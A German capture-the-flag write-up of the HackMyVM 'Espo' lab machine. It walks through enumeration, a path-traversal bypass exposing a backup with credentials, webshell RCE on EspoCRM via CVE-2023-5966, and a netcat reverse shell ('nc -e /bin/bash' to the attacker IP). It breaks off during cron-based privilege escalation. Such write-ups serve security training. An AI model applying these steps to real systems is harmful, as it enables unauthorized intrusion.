﻿﻿<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Espo - HackMyVM - Medium - Bericht</title>
    <link rel="stylesheet" href="style.css">
	<link rel="stylesheet" href="../../horizontale-navbar.css">
    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
</head>
 <body>
 
    <div class="header-bg">
        <h1>Espo - HackMyVM - Level: Medium - Bericht</h1>
        <div class="level-container">
            <h2 class="level-medium">Medium</h2>
            <div class="circle difficulty-medium">
                <div class="segment segment-1"></div>
                <div class="segment segment-2"></div>
                <div class="segment segment-3"></div>
                <div class="inner"></div>
            </div>
        </div>
    </div>

    <div class="container">
        <section class="tools-used">
            <h2>Verwendete Tools</h2>
            <div class="tools-grid">
                <div class="tool-item">arp-scan</div>
                <div class="tool-item">nmap</div>
                <div class="tool-item">vi</div>
                <div class="tool-item">nikto</div>
                <div class="tool-item">dirb</div>
                <div class="tool-item">gobuster</div>
                <div class="tool-item">ffuf</div>
                <div class="tool-item">curl</div>
                <div class="tool-item">wget</div>
                <div class="tool-item">unzip</div>
                <div class="tool-item">cat</div>
                <div class="tool-item">Web Browser</div>
                <div class="tool-item">CVE-2023-5966 Exploit (GitHub)</div>
                <div class="tool-item">nc (netcat)</div>
                <div class="tool-item">stty</div>
                <div class="tool-item">ls</div>
                <div class="tool-item">cd</div>
                <div class="tool-item">id</div>
                <div class="tool-item">ss</div>
                <div class="tool-item">touch</div>
                <div class="tool-item">sleep</div>
                <div class="tool-item">nano</div>
                <div class="tool-item">chmod</div>
                <div class="tool-item">mail</div>
                <div class="tool-item">sudo</div>
                <div class="tool-item">savelog</div>
                <div class="tool-item">ssh-keygen</div>
                <div class="tool-item">cp</div>
            </div>
        </section>

        <section class="toc">
            <h2>Inhaltsverzeichnis</h2>
            <ul>
                <li><a href="#reconnaissance">Reconnaissance</a></li>
                <li><a href="#web-enumeration">Web Enumeration</a></li>
                <li><a href="#path-traversal-backup">Path Traversal & Backup Analysis</a></li>
                <li><a href="#cve-exploit-initial-access">CVE Exploit & Initial Access (www-data)</a></li>
                <li><a href="#privesc-mandie">Privilege Escalation (www-data to mandie via Cronjob)</a></li>
                <li><a href="#privesc-root">Privilege Escalation (mandie to root via sudo savelog)</a></li>
                <li><a href="#flags">Flags</a></li>
            </ul>
        </section>

        <section id="reconnaissance">
            <h2>Reconnaissance</h2>
            <p class="comment">Die initiale Erkundungsphase, um das Zielsystem im Netzwerk zu finden und grundlegende Dienste zu identifizieren.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿cyber)-[~]
└─# <span class="command">arp-scan -l</span></div>
                    <pre>
<span class="command">192.168.2.111</span>	08:00:27:1c:bf:1f	PCS Systemtechnik GmbH
                    </pre>
                </div>
            </div>
            <p class="analysis">**Analyse:** Ein ARP-Scan im lokalen Netzwerksegment identifiziert die IP-Adresse <span class="command">192.168.2.111</span>.</p>
            <p class="evaluation">**Bewertung:** Ziel-IP erfolgreich ermittelt.</p>
            <p class="recommendation">**Empfehlung (Pentester):** IP für weitere Scans verwenden.
            **Empfehlung (Admin):** Standard-Netzwerksicherheitspraktiken.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿cyber)-[~]
└─# <span class="command">vi /etc/hosts</span></div>
                    <pre>
127.0.0.1	localhost
127.0.1.1	cyber
[...]
<span class="command">192.168.2.111   espo.hmv</span>
                    </pre>
                </div>
            </div>
            <p class="analysis">**Analyse:** Der Hostname `espo.hmv` wird der Ziel-IP <span class="command">192.168.2.111</span> in der lokalen `/etc/hosts`-Datei zugeordnet.</p>
            <p class="evaluation">**Bewertung:** Ermöglicht die Adressierung des Ziels über den Hostnamen.</p>
            <p class="recommendation">**Empfehlung (Pentester):** Hostnamen immer eintragen, wenn bekannt.
            **Empfehlung (Admin):** DNS-Management.</p>

             <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿cyber)-[~]
└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.111 -p-</span></div>
                    <pre>
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-30 23:06 CET
Nmap scan report for espo.hmv (192.168.2.111)
Host is up (0.00011s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
<span class="command">22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)</span>
| ssh-hostkey:
|   256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA)
|_  256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519)
<span class="command">80/tcp open  http    nginx</span>
|_http-title: EspoCRM
| http-robots.txt: 1 disallowed entry
|_/
MAC Address: 08:00:27:1C:BF:1F (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: <span class="command">Linux 4.15 - 5.8, Linux 5.0 - 5.5</span>
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.11 ms espo.hmv (192.168.2.111)

OS and Service detection performed. [...]
Nmap done: 1 IP address (1 host up) scanned in [...] seconds
                    </pre>
                     <div class="prompt">┌──(root㉿cyber)-[~]
└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.111 -p- | grep open</span></div>
                    <pre>
<span class="command">22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)</span>
<span class="command">80/tcp open  http    nginx</span>
                    </pre>
                </div>
            </div>
            <p class="analysis">**Analyse:** Der Nmap-Scan (`-sS`, `-sV`, `-A`, `-T5`, `-p-`) auf `espo.hmv` identifiziert zwei offene Ports:
            *   <span class="command">Port 22</span>: SSH (OpenSSH 9.2p1 auf Debian 12).
            *   <span class="command">Port 80</span>: HTTP (Nginx). Der Seitentitel ist "EspoCRM", was auf die installierte Anwendung hinweist. Die `robots.txt` verbietet das Crawlen aller Pfade (`/`).</p>
            <p class="evaluation">**Bewertung:** Die Angriffsfläche beschränkt sich auf SSH und die EspoCRM-Webanwendung auf Port 80. EspoCRM ist nun das Hauptziel für die weitere Untersuchung.</p>
            <p class="recommendation">**Empfehlung (Pentester):** Die EspoCRM-Instanz auf Port 80 gründlich untersuchen (Nikto, Dirb/Gobuster, bekannte CVEs für EspoCRM).
            **Empfehlung (Admin):** SSH und Nginx sicher konfigurieren und aktuell halten. EspoCRM aktuell halten.</p>
        </section>

        <section id="web-enumeration">
            <h2>Web Enumeration</h2>
            <p class="comment">Wir führen spezifischere Scans auf dem Nginx-Webserver (Port 80) durch, um mehr über die EspoCRM-Installation zu erfahren.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿cyber)-[~]
└─# <span class="command">nikto -h 192.168.2.111</span></div>
                    <pre>
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.2.111
+ Target Hostname:    192.168.2.111
+ Target Port:        80
+ Start Time:         2024-03-30 23:06:43 (GMT1)
---------------------------------------------------------------------------
+ Server: <span class="command">nginx</span>
+ /: Retrieved x-powered-by header: <span class="command">PHP/8.2.7</span>.
+ /4QB3WukV.py: The X-Content-Type-Options header is not set. [...]
+ No CGI Directories found [...]
+ /admin/: <span class="password">This might be interesting.</span>
+ /install/: <span class="password">Cookie PHPSESSID created without the httponly flag.</span> [...]
+ /admin/index.html: <span class="password">Admin login page/section found.</span>
+ /portal/console/: Uncommon header 'x-status-reason' found, with contents: Portal console not found.
+ /#wp-config.php#: <span class="password">#wp-config.php# file found.</span> This file contains the credentials. <span class="password">(False Positive?)</span>
+ 8104 requests: 0 error(s) and <span class="password">7 item(s) reported</span> on remote host
+ End Time:           2024-03-30 23:06:58 (GMT1) (15 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
                    </pre>
                </div>
            </div>
            <p class="analysis">**Analyse:** Nikto liefert mehrere Hinweise zur Webanwendung:
            *   Server-Technologie: Nginx mit <span class="command">PHP 8.2.7</span>.
            *   Interessante Pfade: `/admin/` (Login-Seite gefunden unter `/admin/index.html`), `/install/`.
            *   Sicherheitshinweise: Fehlender `HttpOnly`-Flag beim Session-Cookie in `/install/`, fehlender `X-Content-Type-Options`-Header.
            *   Möglicher Fund: `#wp-config.php#`. Dies ist höchstwahrscheinlich ein **False Positive**, da die Anwendung als EspoCRM (PHP) identifiziert wurde, nicht WordPress. Backup-Dateien sind aber generell interessant.</p>
            <p class="evaluation">**Bewertung:** Nikto bestätigt das Vorhandensein eines Admin-Bereichs und eines Installationspfades. Die PHP-Version ist bekannt. Der Fund der `#wp-config.php#` sollte überprüft, aber mit Skepsis betrachtet werden.</p>
            <p class="recommendation">**Empfehlung (Pentester):** Die Pfade `/admin/` und `/install/` besuchen. Versuchen, auf `#wp-config.php#` zuzugreifen. Verzeichnis-Scans durchführen.
            **Empfehlung (Admin):** Sicherheitsheader hinzufügen. `HttpOnly`-Flag setzen. Installationsverzeichnisse nach der Installation entfernen oder schützen. Backup-Dateien nicht im Web-Root belassen.</p>

             <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿cyber)-[~]
└─# <span class="command">dirb http://192.168.2.111</span></div>
                    <pre>
[...]
---- Scanning URL: http://192.168.2.111/ ----
> DIRECTORY: <span class="command">http://192.168.2.111/admin/</span>
> DIRECTORY: <span class="command">http://192.168.2.111/api/</span>
> DIRECTORY: <span class="command">http://192.168.2.111/client/</span>
+ <span class="command">http://192.168.2.111/index.php</span> (CODE:200|SIZE:2480)
> DIRECTORY: <span class="command">http://192.168.2.111/install/</span>
> DIRECTORY: <span class="command">http://192.168.2.111/portal/</span>
+ <span class="command">http://192.168.2.111/robots.txt</span> (CODE:200|SIZE:26)
[...]
---- Entering directory: http://192.168.2.111/admin/ ----
+ <span class="command">http://192.168.2.111/admin/index.html</span> (CODE:200|SIZE:439)
[...]
---- Entering directory: http://192.168.2.111/api/v1/ ----
(!) WARNING: All responses for this directory seem to be CODE = 401.
[...]
---- Entering directory: http://192.168.2.111/install/ ----
+ <span class="command">http://192.168.2.111/install/index.php</span> (CODE:302|SIZE:0)
[...]
                    </pre>
                     <div class="prompt">┌──(root㉿cyber)-[~]
└─# <span class="command">gobuster dir -u http://192.168.2.111 -x [...] -w [...] -b '403,404' -e --no-error -k</span></div>
                     <pre>
[...]
<span class="command">http://192.168.2.111/index.php</span>            (Status: 200) [Size: 2480]
<span class="command">http://192.168.2.111/admin</span>                (Status: 301) [Size: 162] [--> http://192.168.2.111/admin/]
<span class="command">http://192.168.2.111/portal</span>               (Status: 301) [Size: 162] [--> http://192.168.2.111/portal/]
<span class="command">http://192.168.2.111/install</span>              (Status: 301) [Size: 162] [--> http://192.168.2.111/install/]
<span class="command">http://192.168.2.111/client</span>               (Status: 301) [Size: 162] [--> http://192.168.2.111/client/]
<span class="command">http://192.168.2.111/api</span>                  (Status: 301) [Size: 162] [--> http://192.168.2.111/api/]
<span class="command">http://192.168.2.111/robots.txt</span>           (Status: 200) [Size: 26]
[...]
                     </pre>
                </div>
            </div>
             <p class="analysis">**Analyse:** Sowohl `dirb` als auch `gobuster` werden verwendet, um Verzeichnisse zu finden. Sie liefern konsistente Ergebnisse und bestätigen die von Nikto gefundenen Pfade (`/admin`, `/install`, `/portal`, `/client`, `/api`). Der `/api`-Endpunkt scheint Authentifizierung zu erfordern (401 bei `dirb`). `/install/index.php` leitet weiter (Status 302), was darauf hindeutet, dass die Installation möglicherweise abgeschlossen ist, der Ordner aber noch existiert.</p>
            <p class="evaluation">**Bewertung:** Die Verzeichnisstruktur von EspoCRM ist nun klarer. Die Bereiche `/admin`, `/api` und `/install` sind die Hauptinteressenspunkte.</p>
            <p class="recommendation">**Empfehlung (Pentester):** `/admin` auf Standard-Credentials prüfen. `/install` besuchen, um zu sehen, ob es noch zugänglich ist oder Informationen preisgibt. Die API auf bekannte Schwachstellen oder unauthentifizierten Zugriff prüfen (wenig wahrscheinlich nach 401).
            **Empfehlung (Admin):** Installationsverzeichnis nach erfolgreicher Installation entfernen oder unzugänglich machen. API und Admin-Bereich absichern.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt"># <span class="command">Manuelle Code-Inspektion (Browser)</span></div>
                    <pre>
# Aufruf: view-source:http://192.168.2.111/index.php
# Relevanter Ausschnitt:
        <script type="text/javascript" nonce="849d436679ff9363a7e540cdf0e9fbcb">
            window.addEventListener('DOMContentLoaded', () => {
                Espo.loader.setCacheTimestamp(1711836304);
                Espo.loader.setBasePath('');
                Espo.loader.setInternalModuleList(["crm"]);

                require('app', App => {
                    new App({
                        id: 'espocrm-application-id',
                        useCache: true,
                        cacheTimestamp: 1711836304,
                        basePath: '',
                        apiUrl: '<span class="command">api/v1</span>',
                        ajaxTimeout: 60000,
                        internalModuleList: ["crm"],
                    }, app => {
                        app.start();
                    });
                });
            });
        </script>

# Aufruf: http://192.168.2.111/robots.txt
# Inhalt:
User-agent: *
Disallow: /

# Aufruf: view-source:http://192.168.2.111/api/
# Inhalt:
<html>
<head><title><span class="password">403 Forbidden</span></title></head>
<body>
<center><h1><span class="password">403 Forbidden</span></h1></center>
<hr><center>nginx</center>
</body>
</html>
                    </pre>
                </div>
            </div>
             <p class="analysis">**Analyse:** Die manuelle Untersuchung bestätigt:
             *   Die `index.php` lädt JavaScript, das die EspoCRM-Anwendung initialisiert und den API-Pfad `<span class="command">api/v1</span>` verwendet.
             *   `robots.txt` verbietet das Crawlen der gesamten Seite.
             *   Der direkte Zugriff auf `/api/` führt zu einem 403 Forbidden Fehler von Nginx.</p>
             <p class="evaluation">**Bewertung:** Bestätigt die Nutzung von `api/v1` und dass der direkte API-Zugriff blockiert ist.</p>
             <p class="recommendation">**Empfehlung (Pentester):** Versuchen, auf `/api/v1/` zuzugreifen oder spezifische API-Endpunkte zu finden/raten.
             **Empfehlung (Admin):** API-Zugriff korrekt absichern.</p>

        </section>

        <section id="path-traversal-backup">
             <h2>Path Traversal & Backup Analysis</h2>
             <p class="comment">Da die direkten Pfade wenig Angriffspunkte bieten, versuchen wir eine Path-Traversal-Technik, um auf versteckte Verzeichnisse zuzugreifen.</p>

             <div class="code-block">
                <div class="terminal">
                     <div class="prompt">┌──(root㉿cyber)-[~]
└─# <span class="command">ffuf -u http://192.168.2.111/admin../_FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c -fs 146</span></div>
                    <pre>
[...]
________________________________________________

  Method           : GET
  URL              : http://192.168.2.111/admin../_FUZZ
  Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[...]
________________________________________________

<span class="command">oldsite</span>                 [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 2ms]
[...]
                    </pre>
                    <div class="prompt">┌──(root㉿cyber)-[~]
└─# <span class="command">curl http://192.168.2.111/admin../_oldsite</span></div>
                     <pre>
nginx
 
                     </pre>
                </div>
            </div>
             <p class="analysis">**Analyse:** Wir verwenden `ffuf` mit einer speziellen URL: `http://192.168.2.111/admin../_FUZZ`. Der Teil `admin../` ist ein Versuch, aus dem `/admin`-Kontext auszubrechen (`../`) und dann nach Verzeichnissen zu suchen, die mit `_` beginnen (`_FUZZ`). `-fs 146` filtert wahrscheinlich Standard-Not-Found-Antworten aus. `ffuf` findet erfolgreich den Pfad `<span class="command">oldsite</span>`, der auf `http://192.168.2.111/_oldsite/` umleitet (Status 301).</p>
            <p class="evaluation">**Bewertung:** Erfolgreiche Path Traversal / Directory Bypass! Wir haben ein verstecktes Verzeichnis `/_oldsite/` gefunden, das wahrscheinlich nicht direkt erreichbar sein sollte.</p>
             <p class="recommendation">**Empfehlung (Pentester):** Das Verzeichnis `http://192.168.2.111/_oldsite/` mit Tools wie `gobuster` oder `ffuf` weiter auf interessante Dateien scannen.
             **Empfehlung (Admin):** Path-Traversal-Schwachstellen verhindern (Webserver-Konfiguration härten, Eingaben validieren). Versteckte oder alte Verzeichnisse aus dem Web-Root entfernen oder den Zugriff darauf blockieren.</p>

            <div class="code-block">
                <div class="terminal">
                     <div class="prompt">┌──(root㉿cyber)-[~]
└─# <span class="command">gobuster dir -u http://192.168.2.111/admin../_oldsite -x [...] -w [...] -b '403,404' -e --no-error -k</span></div>
                     <pre>
[...]
<span class="command">http://192.168.2.111/admin../_oldsite/info</span>                 (Status: 200) [Size: 540]
<span class="command">http://192.168.2.111/admin../_oldsite/backup.zip</span>           (Status: 200) [Size: 37975754]
[...]
                     </pre>
                 </div>
             </div>
             <p class="analysis">**Analyse:** Ein Gobuster-Scan auf das entdeckte Verzeichnis `/_oldsite/` (wieder über den Traversal-Pfad aufgerufen) findet zwei Dateien: `/info` und eine große Datei namens `<span class="command">backup.zip</span>` (ca. 36MB).</p>
             <p class="evaluation">**Bewertung:** Ein Backup-Archiv im Web-Root ist ein kritischer Fund. Es enthält sehr wahrscheinlich den Quellcode und möglicherweise Konfigurationsdateien mit Zugangsdaten.</p>
             <p class="recommendation">**Empfehlung (Pentester):** Die `backup.zip`-Datei herunterladen (`wget`) und ihren Inhalt analysieren.
             **Empfehlung (Admin):** Niemals Backup-Dateien oder Archive im Web-Root oder anderen öffentlich zugänglichen Verzeichnissen belassen.</p>

             <div class="code-block">
                 <div class="terminal">
                      <div class="prompt">┌──(root㉿cyber)-[~]
└─# <span class="command">wget http://192.168.2.111/admin../_oldsite/backup.zip</span></div>
                     <pre>
--2024-03-30 23:20:29--  http://192.168.2.111/admin../_oldsite/backup.zip
Verbindungsaufbau zu 192.168.2.111:80 … verbunden.
HTTP-Anforderung gesendet, auf Antwort wird gewartet … 200 OK
Länge: 37975754 (36M) [application/zip]
Wird in „backup.zip“ gespeichert.

backup.zip             100%[===================>]  36,22M  --.-KB/s    in 0,1s

<span class="password">2024-03-30 23:20:29 (299 MB/s) - „backup.zip“ gespeichert [37975754/37975754]</span>
                     </pre>
                      <div class="prompt">┌──(root㉿cyber)-[~]
└─# <span class="command">unzip backup.zip</span></div>
                     <pre>
Archive:  backup.zip
[...]
  inflating: data/config.php
[...]
  inflating: vendor/laminas/laminas-servicemanager/src/ConfigInterface.php
   creating: vendor/laminas/laminas-servicemanager/src/Factory/
[...]
  inflating: web.config
  inflating: websocket.php
                     </pre>
                      <div class="prompt">┌──(root㉿cyber)-[~/espo/data] <span class="password"># Pfad impliziert Wechsel in entpacktes Verzeichnis</span>
└─# <span class="command">cat config.php</span></div>
                     <pre>
 
return array (
// --- Config --- //
[...]
  'database' =>
  array (
    'driver' => 'pdo_mysql',
    'host' => 'localhost',
    'port' => NULL,
    'charset' => 'utf8mb4',
    'dbname' => 'espo',
    'user' => 'root',
    'password' => '',
  ),
[...]
  'smtpUsername' => '<span class="command">admin</span>',
  'smtpPassword' => '<span class="password">39Ue4kcVJ#YpaAV24CNmbWU</span>',
[...]
);
                     </pre>
                 </div>
             </div>
              <p class="analysis">**Analyse:** Wir laden die `backup.zip` erfolgreich herunter und entpacken sie. Die Struktur und die Dateinamen deuten stark auf die EspoCRM-Anwendung hin. Wir finden eine `config.php` im `data`-Verzeichnis (oder einem ähnlichen Pfad innerhalb des Backups). Diese Datei enthält Konfigurationseinstellungen, darunter auch SMTP-Zugangsdaten:
              *   Username: `<span class="command">admin</span>`
              *   Passwort: `<span class="password">39Ue4kcVJ#YpaAV24CNmbWU</span>`
              Die Datenbank-Zugangsdaten (`root` ohne Passwort) scheinen weniger nützlich oder Standard zu sein.</p>
              <p class="evaluation">**Bewertung:** Kritischer Fund! Wir haben potenzielle Zugangsdaten (`admin` / `39Ue...`) gefunden. Da Anwendungen oft Passwörter wiederverwenden, besteht eine hohe Wahrscheinlichkeit, dass diese auch für den EspoCRM-Admin-Login auf der Hauptseite (`http://192.168.2.111/`) gültig sind.</p>
              <p class="recommendation">**Empfehlung (Pentester):** Versuchen, sich mit den gefundenen SMTP-Credentials (`admin` / `39Ue...`) im EspoCRM-Admin-Interface (`/admin` oder Hauptseite) anzumelden.
              **Empfehlung (Admin):** Backups sicher speichern und nicht im Web-Root ablegen. Keine Klartext-Passwörter in Konfigurationsdateien speichern, wenn möglich. Eindeutige Passwörter für verschiedene Dienste verwenden.</p>
        </section>

        <section id="cve-exploit-initial-access">
            <h2>CVE Exploit & Initial Access (www-data)</h2>
            <p class="comment">Wir verwenden die im Backup gefundenen Zugangsdaten, um uns bei EspoCRM anzumelden. Anschließend identifizieren wir die Version und suchen nach bekannten Schwachstellen.</p>

             <div class="code-block">
                 <div class="terminal">
                     <div class="prompt"># <span class="command">Aktion im Webbrowser (EspoCRM Login)</span></div>
                     <pre>
# Aufruf: http://192.168.2.111/ (oder /admin/)
# Eingabe im Login-Formular:
Username: <span class="command">admin</span>
Password: <span class="password">39Ue4kcVJ#YpaAV24CNmbWU</span>
# Ergebnis: <span class="password">Erfolgreicher Login</span> als Administrator.

# Aktion: Version überprüfen (z.B. unter About / Hilfe / Admin-Einstellungen)
# Ergebnis: EspoCRM Version <span class="command">7.2.4</span>
                     </pre>
                      <div class="prompt"># <span class="command">Aktion: Google-Suche nach CVEs</span></div>
                     <pre>
# Suche nach: "EspoCRM 7.2.4 exploit" oder "EspoCRM 7.2.4 CVE"
# Ergebnis: Hinweis auf <span class="command">CVE-2023-5966</span> (RCE via Extension Upload) mit verfügbarem PoC auf GitHub.
# GitHub Repo: <span class="command">https://github.com/pedrojosenavasperez/cve-2023-5966</span>
                     </pre>
                 </div>
             </div>
              <p class="analysis">**Analyse:** Der Login bei EspoCRM mit den gefundenen Zugangsdaten (`admin` / `39Ue...`) ist erfolgreich. Wir stellen fest, dass die Version <span class="command">7.2.4</span> installiert ist. Eine schnelle Recherche ergibt, dass diese Version anfällig für die Remote Code Execution Schwachstelle <span class="command">CVE-2023-5966</span> ist, die durch das Hochladen einer präparierten Erweiterung (Extension) ausgenutzt werden kann. Ein Proof-of-Concept (PoC) ist auf GitHub verfügbar.</p>
              <p class="evaluation">**Bewertung:** Wir haben administrativen Zugriff und eine bekannte RCE-Schwachstelle für die installierte Version identifiziert. Der Weg zum initialen Zugriff auf das System als Webserver-Benutzer ist klar.</p>
              <p class="recommendation">**Empfehlung (Pentester):** Den PoC für CVE-2023-5966 von GitHub herunterladen. Die Anweisungen befolgen, um die bösartige Erweiterung (die eine Webshell enthält) zu erstellen und über das EspoCRM-Admin-Panel (`Admin > Extensions`) hochzuladen. Anschließend die Webshell aufrufen.
              **Empfehlung (Admin):** **EspoCRM sofort auf die neueste, gepatchte Version aktualisieren!** Bis dahin die Möglichkeit zum Hochladen von Erweiterungen deaktivieren oder stark einschränken.</p>

              <div class="code-block">
                  <div class="terminal">
                      <div class="prompt"># <span class="command">Aktion im Webbrowser (Exploit Ausführung)</span></div>
                      <pre>
# 1. PoC für CVE-2023-5966 (ZIP-Datei) von GitHub herunterladen.
# 2. In EspoCRM einloggen (admin / 39Ue...).
# 3. Navigieren zu Admin -> Extensions.
# 4. Die heruntergeladene ZIP-Datei hochladen und installieren. <span class="password">(Erfolgreich)</span>
# 5. Die vom Exploit erstellte Webshell aufrufen: <span class="command">http://192.168.2.111/webshell.php</span>
# 6. Im Webshell-Interface den Befehl 'id' eingeben.
# Ausgabe im Webshell:
<span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
                      </pre>
                  </div>
              </div>
               <p class="analysis">**Analyse:** Wir folgen den Schritten des PoC für CVE-2023-5966. Wir laden die präparierte Erweiterung (ZIP-Datei) über das Admin-Panel hoch. Nach erfolgreicher Installation ist eine Webshell unter `/webshell.php` erreichbar. Wir rufen diese auf und führen den `id`-Befehl aus, der bestätigt, dass wir nun Code als Benutzer `<span class="command">www-data</span>` ausführen können.</p>
               <p class="evaluation">**Bewertung:** RCE erfolgreich ausgenutzt. Wir haben eine Webshell und damit Codeausführung als `www-data` erreicht.</p>
               <p class="recommendation">**Empfehlung (Pentester):** Die Webshell nutzen, um eine stabilere Reverse Shell zu unserer Maschine zu bekommen.
               **Empfehlung (Admin):** EspoCRM patchen.</p>

               <div class="code-block">
                   <div class="terminal">
                       <div class="prompt">┌──(root㉿cyber)-[~/espo/data]
└─# <span class="command">nc -lvnp 4444</span></div>
                       <pre>listening on [any] 4444 ...</pre>
                       <div class="prompt"># <span class="command">Aktion im Webshell oder via URL</span></div>
                       <pre>
# Eingabe im Webshell oder Aufruf der URL:
# URL: http://192.168.2.111/webshell.php?cmd=<span class="command">nc+-e+%2Fbin%2Fbash+192.168.2.199+4444</span>
# (Alternativ: Eingabe in Webshell: nc -e /bin/bash 192.168.2.199 4444)
                       </pre>
                       <div class="prompt">┌──(root㉿cyber)-[~/espo/data]
└─# <span class="command">nc -lvnp 4444</span></div>
                       <pre>
listening on [any] 4444 ...
<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.111] 56124</span>
<span class="command"># Shell als www-data erhalten</span>
id <span class="password"># (Implizit ausgeführt oder manuell nach Verbindung)</span>
<span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
                       </pre>
                       <div class="prompt"># <span class="command">Shell Stabilisierung</span></div>
                       <div class="prompt">www-data@espo:~/html/public$ <span class="command">stty rows 48 cols 94</span></div>
                       <div class="prompt">www-data@espo:~/html/public$ <span class="command">id</span></div>
                       <pre><span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></pre>
                   </div>
               </div>
                <p class="analysis">**Analyse:** Wir starten einen Netcat-Listener auf Port 4444. Über die Webshell führen wir einen Netcat-Befehl (`nc -e /bin/bash [Angreifer-IP] 4444`) aus, um eine Reverse Shell zu unserem Listener aufzubauen. Die Verbindung wird erfolgreich hergestellt, und wir erhalten eine Shell als `www-data`. Die Shell wird anschließend mit `stty` stabilisiert.</p>
                <p class="evaluation">**Bewertung:** Initialer Zugriff als `www-data` über eine Reverse Shell erfolgreich etabliert.</p>
                <p class="recommendation">**Empfehlung (Pentester):** Umgebung als `www-data` enumerieren, nach Privesc-Vektoren suchen.
                **Empfehlung (Admin):** EspoCRM patchen, Netzwerk-Egress-Filterung.</p>
        </section>

        <section id="privesc-mandie">
             <h2>Privilege Escalation (www-data to mandie via Cronjob)</h2>
             <p class="comment">Wir haben eine Shell als `www-data` und suchen nach Wegen zur Rechteerweiterung. Wir enumerieren das System.</p>

             <div class="code-block">
                 <div class="terminal">
                     <div class="prompt">www-data@espo:~$ <span class="command">cd /home/</span></div>
                     <div class="prompt">www-data@espo:/home$ <span class="command">ls -la</span></div>
                     <pre>
total 12
drwxr-xr-x  3 root   root   4096 Jan 24 19:01 .
drwxr-xr-x 18 root   root   4096 Dec  4 07:02 ..
drwxr-xr-x  6 <span class="command">mandie</span> mandie 4096 Mar 30 23:50 mandie
                     </pre>
                     <div class="prompt">www-data@espo:/home$ <span class="command">cd mandie/</span></div>
                     <div class="prompt">www-data@espo:/home/mandie$ <span class="command">ls -la</span></div>
                     <pre>
[...]
-rwxr-xr--  1 mandie mandie  493 Dec  4 15:42 <span class="command">copyPics</span>
drwxr-xr-x  2 mandie mandie 4096 Mar 30 23:51 pictures
-rwx------  1 mandie mandie   33 Jan 24 19:01 user.txt
drwxr-xr-x  2 mandie mandie 4096 Mar 30 23:51 videos
                     </pre>
                     <div class="prompt">www-data@espo:/home/mandie$ <span class="command">cat user.txt</span></div>
                      <pre><span class="password">cat: user.txt: Permission denied</span></pre>
                     <div class="prompt">www-data@espo:/home/mandie$ <span class="command">cat copyPics</span></div>
                     <pre>
#!/bin/bash

SOURCE_MEDIAS="<span class="command">/var/shared_medias</span>"
PICTURES_DIR="$HOME/pictures"
VIDEOS_DIR="$HOME/videos"

/usr/bin/find "$SOURCE_MEDIAS" <span class="command">! -executable</span> -exec /usr/bin/cp {} "<span class="command">$HOME</span>" 2>/dev/null \;
mkdir -p "$PICTURES_DIR" "$VIDEOS_DIR"

declare -A directory_mappings
directory_mappings=( ["$PICTURES_DIR"]="jpeg jpg" ["$VIDEOS_DIR"]="mp4 avi" )

for dir in "${!directory_mappings[@]}"; do
    for ext in ${directory_mappings[$dir]}; do
        mv "$HOME"/.*$ext "$dir/" 2>/dev/null # Potenzieller Fehler/Ungenauigkeit im Original: .*$ext
    done
done

                     </pre>
                 </div>
             </div>
              <p class="analysis">**Analyse:** Die Enumeration zeigt einen Benutzer `<span class="command">mandie</span>`. Wir können ihre `user.txt` nicht lesen. In ihrem Home-Verzeichnis finden wir ein Skript namens `<span class="command">copyPics</span>`. Das Skript kopiert nicht-ausführbare Dateien aus `/var/shared_medias` in das Home-Verzeichnis des Benutzers, der das Skript ausführt (`$HOME`), und versucht dann, Dateien mit bestimmten Endungen in die Unterverzeichnisse `pictures` oder `videos` zu verschieben. Die `mv`-Zeile enthält einen potenziellen Fehler (`.*$ext` statt `*.$ext`), der aber hier nicht relevant ist. Wichtig ist, dass nicht-ausführbare Dateien aus einem (wahrscheinlich) gemeinsam nutzbaren Verzeichnis kopiert werden.</p>
              <p class="evaluation">**Bewertung:** Das Skript `copyPics`, insbesondere wenn es regelmäßig als `mandie` ausgeführt wird (z.B. per Cronjob), stellt einen potenziellen Privesc-Vektor dar. Wenn wir eine Datei in `/var/shared_medias` erstellen können, wird sie als `mandie` in ihr Home-Verzeichnis kopiert.</p>
              <p class="recommendation">**Empfehlung (Pentester):** Überprüfen, ob `/var/shared_medias` für `www-data` beschreibbar ist. Testen, ob das `copyPics`-Skript tatsächlich periodisch läuft (z.B. durch Erstellen einer Testdatei und Warten). Einen Exploit entwickeln, der dies ausnutzt (z.B. `.forward`-Datei, `.bashrc`, `.ssh/authorized_keys`).
